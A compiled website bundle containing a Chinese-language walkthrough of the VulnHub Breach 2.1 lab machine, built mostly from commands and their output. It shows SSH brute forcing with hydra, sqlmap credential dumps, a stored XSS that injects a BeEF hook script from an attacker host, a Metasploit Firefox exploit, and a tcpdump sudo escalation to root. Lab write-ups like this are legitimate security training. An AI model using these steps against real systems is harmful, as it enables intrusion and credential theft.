"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[555],{8453:(n,e,r)=>{r.d(e,{R:()=>i,x:()=>o});var s=r(6540);const a={},t=s.createContext(a);function i(n){const e=s.useContext(t);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:i(n.components),s.createElement(t.Provider,{value:e},n.children)}},8598:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/Breach2.1","title":"Breach2.1","description":"VirtualBox users Linux Version: Debian 64bit","source":"@site/docs/VulnHub/Virtual Machines/Breach2.1.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Breach2.1","permalink":"/docs/VulnHub/Virtual Machines/Breach2.1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Breach2.1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Breach1","permalink":"/docs/VulnHub/Virtual Machines/Breach1"},"next":{"title":"DC-1","permalink":"/docs/VulnHub/Virtual Machines/DC-1"}}');var a=r(4848),t=r(8453);const i={},o=void 0,c={},l=[{value:"port scan",id:"port-scan",level:2},{value:"ssh",id:"ssh",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function h(n){const e={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,t.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsxs)(e.blockquote,{children:["\n",(0,a.jsx)(e.p,{children:"VirtualBox users: if the screen goes black on boot once past the grub screen make sure to go to settings ---\x3e general, and make sure it says Type: Linux Version: Debian 64bit"}),"\n"]}),"\n",(0,a.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"nmap -sT --min-rate=8899 -p- 192.168.110.151 -oN nmap_result/port\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 03:21 EST\r\nNmap scan report for 192.168.110.151 (192.168.110.151)\r\nHost is up (0.020s latency).\r\nNot shown: 65532 closed tcp ports (conn-refused)\r\nPORT      STATE SERVICE\r\n111/tcp   open  rpcbind\r\n46218/tcp open  unknown\r\n65535/tcp open  unknown\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"# Nmap 7.94SVN scan initiated Sat Feb 15 03:21:43 2025 as: nmap -sT -sC -sV -O -p111,46218,65535 -oN nmap_result/detils 192.168.110.151\r\nNmap scan report for 192.168.110.151 (192.168.110.151)\r\nHost is up (0.00099s latency).\r\n\r\nPORT      STATE SERVICE VERSION\r\n111/tcp   open  rpcbind 2-4 (RPC #100000)\r\n| rpcinfo: \r\n|   program version    port/proto  service\r\n|   100000  2,3,4        111/tcp   rpcbind\r\n|   100000  2,3,4        111/udp   rpcbind\r\n|   100000  3,4          111/tcp6  rpcbind\r\n|   100000  3,4          111/udp6  rpcbind\r\n|   100024  1          34339/udp   status\r\n|   100024  1          41699/udp6  status\r\n|   100024  1          44535/tcp6  status\r\n|_  100024  1          46218/tcp   status\r\n46218/tcp open  status  1 (RPC #100024)\r\n65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)\r\n|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)\r\n|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)\r\n|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e (ED25519)\r\nMAC Address: 08:00:27:81:C7:9B (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u53ea\u5f00\u653essh\u670d\u52a1"}),"\n",(0,a.jsx)(e.h2,{id:"ssh",children:"ssh"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"\u2514\u2500$ ssh root@192.168.110.151 -p65535\r\n#############################################################################\r\n#                  Welcome to Initech Cyber Consulting, LLC                 #\r\n#                 All connections are monitored and recorded                #\r\n#                     Unauthorized access is encouraged                     #\r\n#             Peter, if that's you - the password is in the source.         #\r\n#          Also, stop checking your blog all day and enjoy your vacation!   # \r\n#############################################################################\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u63d0\u793a\uff1apeter\u7684\u5bc6\u7801\u662f\uff1a",(0,a.jsx)(e.code,{children:"in the source"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:'hydra -L users.txt -P passwd.txt ssh://192.168.110.151:65535 -t 4 -vV -e ns\r\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\r\n\r\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-15 08:00:57\r\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:1/p:8), ~2 tries per task\r\n[DATA] attacking ssh://192.168.110.151:65535/\r\n[VERBOSE] Resolving addresses ... [VERBOSE] resolving done\r\n[INFO] Testing if password authentication is supported by ssh://peter@192.168.110.151:65535\r\n[INFO] Successful, password authentication is supported by ssh://192.168.110.151:65535\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "peter" - 1 of 8 [child 0] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "" - 2 of 8 [child 1] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "Consulting" - 3 of 8 [child 2] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "consulting" - 4 of 8 [child 3] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "Peter" - 5 of 8 [child 1] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "in the source" - 6 of 8 [child 0] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "inthesource." - 7 of 8 [child 2] (0/0)\r\n[ATTEMPT] target 192.168.110.151 - login "peter" - pass "inthesource" - 8 of 8 [child 1] (0/0)\r\n[STATUS] attack finished for 192.168.110.151 (waiting for children to complete tests)\r\n[65535][ssh] host: 192.168.110.151   login: peter   password: inthesource\r\n1 of 1 target successfully completed, 1 valid password found\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u5bc6\u7801\uff1a",(0,a.jsx)(e.code,{children:"inthesource"})]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.code,{children:"ssh peter@192.168.110.151 -p65535"})}),"\n",(0,a.jsx)(e.p,{children:"\u767b\u5f55\u4e0d\u4e0a\uff0c\u4f46\u662f\u8f93\u5165\u5bc6\u7801\u540e\uff0c\u5361\u4e86\u5f88\u4e45\uff0c\u53ef\u80fd\u662f\u52a0\u8f7d\u4e86\u4e00\u4e9b\u670d\u52a1"}),"\n",(0,a.jsx)(e.p,{children:"\u518d\u6b21\u626b\u63cf\u670d\u52a1"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"nmap -sT --min-rate=8899 -p- 192.168.110.151\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 08:16 EST\r\nNmap scan report for 192.168.110.151 (192.168.110.151)\r\nHost is up (0.012s latency).\r\nNot shown: 65531 closed tcp ports (conn-refused)\r\nPORT      STATE SERVICE\r\n80/tcp    open  http\r\n111/tcp   open  rpcbind\r\n51208/tcp open  unknown\r\n65535/tcp open  unknown\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5f00\u653e\u4e8680\uff0chttp\u670d\u52a1"}),"\n",(0,a.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,a.jsx)(e.p,{children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"dirb http://192.168.110.151/            \r\n\r\n-----------------\r\nDIRB v2.22    \r\nBy The Dark Raver\r\n-----------------\r\n\r\nSTART_TIME: Sat Feb 15 08:07:00 2025\r\nURL_BASE: http://192.168.110.151/\r\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\r\n\r\n-----------------\r\n\r\nGENERATED WORDS: 4612                                                          \r\n\r\n---- Scanning URL: http://192.168.110.151/ ----\r\n==> DIRECTORY: http://192.168.110.151/blog/\r\n==> DIRECTORY: http://192.168.110.151/images/\r\n+ http://192.168.110.151/index.html (CODE:200|SIZE:468)\r\n+ http://192.168.110.151/server-status (CODE:403|SIZE:303)\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5b58\u5728xss\uff0csql\u6f0f\u6d1e"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215211901731.png",alt:"image-20250215211901731"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"sqlmap -u http://192.168.110.151/blog/index.php?search=1 --level 3 --batch\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215212158933.png",alt:"image-20250215212158933"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"[*] blog\r\n[*] information_schema\r\n[*] mysql\r\n[*] oscommerce\r\n[*] performance_schema\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"sqlmap -u http://192.168.110.151/blog/index.php?search=1 --level 3 -D mysql -T user -C User,Password --dump\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u6ca1\u5176\u4ed6\u7528\u6237\uff0croot\u7684\u5bc6\u7801\u662f\u7a7a"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"Database: mysql\r\nTable: user\r\n[4 entries]\r\n+------------------+-------------------------------------------+\r\n| User             | Password                                  |\r\n+------------------+-------------------------------------------+\r\n| root             | <blank>                                   |\r\n| root             | <blank>                                   |\r\n| root             | <blank>                                   |\r\n| debian-sys-maint | *D0C78CEFE547A41E829542C969E697104594B2C0 |\r\n+------------------+-------------------------------------------+\n"})}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"oscommerce"}),"\u6570\u636e\u5e93"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"sqlmap -u http://192.168.110.151/blog/index.php?search=1 --level 3 -D oscommerce -T osc_administrators -C user_name,user_password --dump\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"Database: oscommerce\r\nTable: osc_administrators\r\n[1 entry]\r\n+-----------+-------------------------------------+\r\n| user_name | user_password                       |\r\n+-----------+-------------------------------------+\r\n| admin     | 685cef95aa31989f2edae5e055ffd2c9:32 |\r\n+-----------+-------------------------------------+\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u7206\u7834\u51fa\u6765\u662f\uff1a32admin"}),"\n",(0,a.jsx)(e.p,{children:"\u7136\u540e\u5c1d\u8bd5\u5199shell\uff0c\u5e76\u6ca1\u6709\u6743\u9650"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"searchsploit blogphp -m 17640\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u8fd9\u8fd8\u6709\u4e2axss"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:'How to exploit:\r\n1- Go there : http://localhost/blogphp/register.html.\r\n2- Put in the Username field the XSS Code.  Example:<META http-equiv="refresh" content="0;URL=http://www.google.com">  .\r\n3- Put anything in the other field ( Password & E-mail).\r\n4- Now anyone go there : http://localhost/blogphp/members.html will redirected to google.com OR exploit your XSS Code.\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u7528\u6237\u540d\u5904\uff0c\u5b58\u5728xss\uff0c\u7136\u540e\u8bbf\u95eemembers.html"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213136771.png",alt:"image-20250215213136771"})}),"\n",(0,a.jsx)(e.p,{children:"\u7528beef-xss\u6d4b\u8bd5"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.code,{children:'<script src="http://192.168.110.7:3000/hook.js"><\/script>'})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213409465.png",alt:"image-20250215213409465"})}),"\n",(0,a.jsx)(e.p,{children:"\u7b49\u5f85\u540e\u53f0\u70b9\u51fb"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213247928.png",alt:"image-20250215213247928"})}),"\n",(0,a.jsxs)(e.p,{children:["\u53d1\u73b0\u706b\u72d0\u6d4f\u89c8\u5668\u7248\u672c\u5f88\u4f4e\uff0c",(0,a.jsx)(e.code,{children:"Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"searchsploit firefox 15\r\nMozilla Firefox 5.0 < 15.0.1 - __exposedProps__ XCS Code Execution (Metasploit)\n"})}),"\n",(0,a.jsx)(e.p,{children:"xss\uff0c\u4ee3\u7801\u6267\u884c"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213850545.png",alt:"image-20250215213850545"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7136\u540e\u4f7f\u7528beef-xss\uff0c\u8df3\u8f6c\u5230",(0,a.jsx)(e.code,{children:"http://192.168.110.7:8080/test"})]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215214642395.png",alt:"image-20250215214642395"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215215449858.png",alt:"image-20250215215449858"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7136\u540e\u4f7f\u7528",(0,a.jsx)(e.code,{children:"post/multi/manage/shell_to_meterpreter"}),"\uff0c\u5347\u7ea7\u4e00\u4e0bshell"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215215417219.png",alt:"image-20250215215417219"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"$ cat firefox.sh\r\n#!/bin/bash\r\n\r\nxvfb-run --auto-servernum --server-num=1 /opt/firefox/firefox http://192.168.110.151/blog/members.html\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.code,{children:"/etc/ssh/sshd_config"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"UsePAM yes\r\nAllowUsers peter\r\nForceCommand /usr/bin/startme\r\nAddressFamily inet\n"})}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"ForceCommand"})," \u662f\u4e00\u4e2a\u7528\u4e8e\u5f3a\u5236\u6267\u884c\u7279\u5b9a\u547d\u4ee4\u7684\u914d\u7f6e\u9009\u9879\uff0c\u901a\u5e38\u662f\u5728 SSH \u670d\u52a1\u5668\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u8fdb\u884c\u8bbe\u7f6e\u3002\u5b83\u7684\u4e3b\u8981\u7528\u9014\u662f\u5728\u7528\u6237\u8fde\u63a5\u65f6\uff0c\u65e0\u8bba\u4ed6\u4eec\u5c1d\u8bd5\u6267\u884c\u4ec0\u4e48\u64cd\u4f5c\uff0c\u670d\u52a1\u5668\u90fd\u4f1a\u5f3a\u5236\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\u3002"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"meterpreter > cat /usr/bin/startme\r\n#!/bin/bash\r\n\r\nsudo /etc/init.d/apache2 start &> /dev/null\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"$ whoami\r\npeter\r\n$ sudo -l\r\nMatching Defaults entries for peter on breach2:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser peter may run the following commands on breach2:\r\n    (root) NOPASSWD: /etc/init.d/apache2\n"})}),"\n",(0,a.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,a.jsx)(e.p,{children:"\u67e5\u770b\u7f51\u7edc\u8fde\u63a5"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"$ netstat -lntp\r\n(Not all processes could be identified, non-owned process info\r\n will not be shown, you would have to be root to see it all.)\r\nActive Internet connections (only servers)\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\r\ntcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 0.0.0.0:51208           0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               \r\ntcp6       0      0 :::111                  :::*                    LISTEN      -               \r\ntcp6       0      0 :::80                   :::*                    LISTEN      -               \r\ntcp6       0      0 :::33041                :::*                    LISTEN      -               \n"})}),"\n",(0,a.jsx)(e.p,{children:"\u672c\u5730\u5b58\u5728\u4e00\u4e2a2323\u7aef\u53e3"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"$ telnet 127.0.0.1 2323\r\nTrying 127.0.0.1...\r\nConnected to 127.0.0.1.\r\nEscape character is '^]'.\r\n29 45'46\" N 95 22'59\" W \r\nbreach2 login: \n"})}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"29 45'46\" N 95 22'59\" W "}),"\u4e00\u4e2a\u7ecf\u7eac\u5ea6"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215223059174.png",alt:"image-20250215223059174"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.code,{children:"Houston Police Department Memorial"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7136\u540e\u5c1d\u8bd5\uff0cmilton\u7684\u5bc6\u7801\u662f",(0,a.jsx)(e.code,{children:"Houston "})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"$ telnet 127.0.0.1 2323\r\nTrying 127.0.0.1...\r\nConnected to 127.0.0.1.\r\nEscape character is '^]'.\r\n29 45'46\" N 95 22'59\" W \r\nbreach2 login: milton\r\nPassword: \r\nLast login: Sat Feb 15 17:29:07 EST 2025 from localhost on pts/1\r\nLinux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64\r\n29 45'46\" N 95 22'59\" W \r\n3\r\n2\r\n1\r\nWhose stapler is it?\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u641c\u7d22\u5173\u952e\u8bcd",(0,a.jsx)(e.code,{children:"Whose stapler is it?"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:'$ grep -rino \'Whose stapler is it?\' /usr\r\n/usr/local/bin/cd.py:16:Whose stapler is it?\r\n$ cat /usr/local/bin/cd.py\r\n#!/usr/bin/python\r\n\r\nimport signal\r\nimport time\r\nimport os\r\n\r\ns = signal.signal(signal.SIGINT, signal.SIG_IGN)\r\n\r\ncountdown=3\r\n\r\nwhile countdown >0:\r\n        time.sleep(1)\r\n        print(countdown)\r\n        countdown -=1\r\nif countdown <1:\r\n        question = raw_input("Whose stapler is it?")\r\nif question == "mine":\r\n        os.system("echo \'Woot!\'")\r\nelse:\r\n\r\n        os.system("kill -9 %d"%(os.getppid()))\r\n        signal.signal(signal.SIGINT, s)\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u8f93\u5165",(0,a.jsx)(e.code,{children:"mine"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"$ telnet 127.0.0.1 2323\r\nTrying 127.0.0.1...\r\nConnected to 127.0.0.1.\r\nEscape character is '^]'.\r\n29 45'46\" N 95 22'59\" W \r\nbreach2 login: milton\r\nPassword: \r\nLast login: Sat Feb 15 17:38:48 EST 2025 from localhost on pts/1\r\nLinux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64\r\n29 45'46\" N 95 22'59\" W \r\n3\r\n2\r\n1\r\nWhose stapler is it?mine\r\nWoot!\r\nmilton@breach2:~$ id\r\nuid=1002(milton) gid=1002(milton) groups=1002(milton)\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u6210\u529f\u5207\u6362\u5230",(0,a.jsx)(e.code,{children:"milton"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"milton@breach2:~$ sudo -l\r\nSorry, user milton may not run sudo on breach2.\r\nmilton@breach2:~$ netstat -lntp\r\n(Not all processes could be identified, non-owned process info\r\n will not be shown, you would have to be root to see it all.)\r\nActive Internet connections (only servers)\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\r\ntcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 0.0.0.0:51208           0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               \r\ntcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               \r\ntcp6       0      0 :::8888                 :::*                    LISTEN      -               \r\ntcp6       0      0 :::111                  :::*                    LISTEN      -               \r\ntcp6       0      0 :::80                   :::*                    LISTEN      -               \r\ntcp6       0      0 :::33041                :::*                    LISTEN      - \n"})}),"\n",(0,a.jsx)(e.p,{children:"\u53c8\u5f00\u653e\u4e868888\u7aef\u53e3"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"nmap -sT -p8888 192.168.110.151 -sV -sC    \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 09:41 EST\r\nNmap scan report for 192.168.110.151 (192.168.110.151)\r\nHost is up (0.014s latency).\r\n\r\nPORT     STATE SERVICE VERSION\r\n8888/tcp open  http    nginx 1.6.2\r\n|_http-title: Index of /\r\n|_http-server-header: nginx/1.6.2\r\n| http-ls: Volume /\r\n| SIZE  TIME               FILENAME\r\n| -     15-Jun-2016 20:50  oscommerce/\r\n| 867   15-Jun-2016 18:09  index.nginx-debian.html\r\n|_\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"milton@breach2:~$ find / -writable 2>/dev/null | grep -v 'proc' | grep -v 'sys' | grep -v 'dev'\r\n/var/lock\r\n/var/tmp\r\n/var/tmp/kdecache-milton\r\n/var/tmp/kdecache-milton/plasma-wallpapers\r\n/var/tmp/kdecache-milton/plasma-wallpapers/usr\r\n/var/tmp/kdecache-milton/plasma-wallpapers/usr/share\r\n/var/tmp/kdecache-milton/plasma-wallpapers/usr/share/images\r\n/var/tmp/kdecache-milton/plasma-wallpapers/usr/share/images/desktop-base\r\n/var/tmp/kdecache-milton/plasma-wallpapers/usr/share/images/desktop-base/lines-wallpaper_1920x1080.svg_#000000_2_800x600.png\r\n/var/tmp/kdecache-milton/ksycoca4stamp\r\n/var/tmp/kdecache-milton/Personal Calendarrc\r\n/var/tmp/kdecache-milton/plasma-svgelements-default_v2.0\r\n/var/tmp/kdecache-milton/plasma_theme_default_v2.0.kcache\r\n/var/tmp/kdecache-milton/favicons\r\n/var/tmp/kdecache-milton/ksycoca4\r\n/var/tmp/kdecache-milton/icon-cache.kcache\r\n/var/lib/php5/sessions\r\n/var/www/html2/oscommerce/includes/work\n"})}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"/var/www/html2/oscommerce/includes/work"}),"\u53ef\u5199\u76ee\u5f55\uff0c\u53ef\u4ee5\u62ff\u5230webshell"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215224606085.png",alt:"image-20250215224606085"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"blumbergh@breach2:/home/bill$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for blumbergh on breach2:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser blumbergh may run the following commands on breach2:\r\n    (root) NOPASSWD: /usr/sbin/tcpdump\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"blumbergh@breach2:/home/bill$ echo '#!/bin/sh' > 1.sh\r\nblumbergh@breach2:/home/bill$ echo 'cp /bin/bash /home/bill/bash' >> 1.sh\r\nblumbergh@breach2:/home/bill$ echo 'chmod +s /home/bill/bash' >> 1.sh\r\necho 'chmod +s /home/bill/bash' >> 1.sh\r\nblumbergh@breach2:/home/bill$ cat 1.sh\r\n#!/bin/sh\r\ncp /bin/bash /home/bill/bash\r\nchmod +s /home/bill/bash\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-sh",children:"blumbergh@breach2:/home/bill$ chmod +x 1.sh\r\nblumbergh@breach2:/home/bill$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /home/bill/1.sh -Z root\r\ndropped privs to root\r\ntcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\r\nMaximum file limit reached: 1\r\n\r\nblumbergh@breach2:/home/bill$ ls\r\n1.sh\r\nbash\r\nblumbergh@breach2:/home/bill$ ls -la\r\ntotal 1020\r\ndrwxr-xr-x 2 blumbergh blumbergh    4096 Feb 15 17:49 .\r\ndrwxr-xr-x 5 root      root         4096 Jun 19  2016 ..\r\n-rwxr-xr-x 1 blumbergh blumbergh      64 Feb 15 17:48 1.sh\r\n-rwsr-sr-x 1 root      root      1029624 Feb 15 17:49 bash\r\nblumbergh@breach2:/home/bill$ ./bash -p\r\n./bash -p\r\nid\r\nuid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) egid=0(root) groups=0(root),1001(blumbergh),1004(fin)\r\nwhoami\r\nroot\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215225125630.png",alt:"image-20250215225125630"})})]})}function p(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(h,{...n})}):h(n)}}}]);